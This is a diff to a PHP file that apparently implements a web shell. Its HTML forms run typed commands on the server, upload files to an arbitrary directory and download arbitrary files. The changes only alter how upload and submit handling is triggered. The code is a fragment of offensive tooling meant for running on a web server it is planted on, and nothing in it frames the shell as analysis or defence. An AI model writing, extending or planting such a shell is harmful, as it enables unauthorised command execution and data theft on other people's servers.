@@ -33,7 +33,7 @@
         }
     }
 
-    if(isset($_POST["uploadSubmit"])) {
+    if(isset($_FILES["uploadFiles"])) {
         if(isset($_POST["uploadDir"]) && trim($_POST["uploadDir"]) !== "") {
             $upload_dir = $_POST["uploadDir"];
         } else {
@@ -85,7 +85,7 @@
     <body>
         <form id="cmdForm" method="POST" action="">
             <input type="text" id="cmd" name="cmd" placeholder="Enter command, use arrow keys for history" autofocus="autofocus" class="cmdBox" />
-            <input type="submit" name="cmdSubmit" value="Run" />
+            <input type="submit" value="Run" />
         </form>
         <div class="infoText">
 <?php
@@ -158,7 +158,7 @@
             <form method="POST" action="" enctype="multipart/form-data">
                 <input type="text" name="uploadDir" placeholder="Destination folder" />
                 <input type="file" name="uploadFiles[]" multiple="multiple" />
-                <input type="submit" name="uploadSubmit" value="Upload" />
+                <input type="submit" value="Upload" />
             </form>
         </div>
         <div class="featureBox">
@@ -172,7 +172,7 @@
             </div>
             <form method="POST" action="">
                 <input type="text" name="downloadFile" placeholder="File to download" />
-                <input type="submit" name="downloadSubmit" value="Download" />
+                <input type="submit" value="Download" />
             </form>
         </div>
         <div class="featureBox">
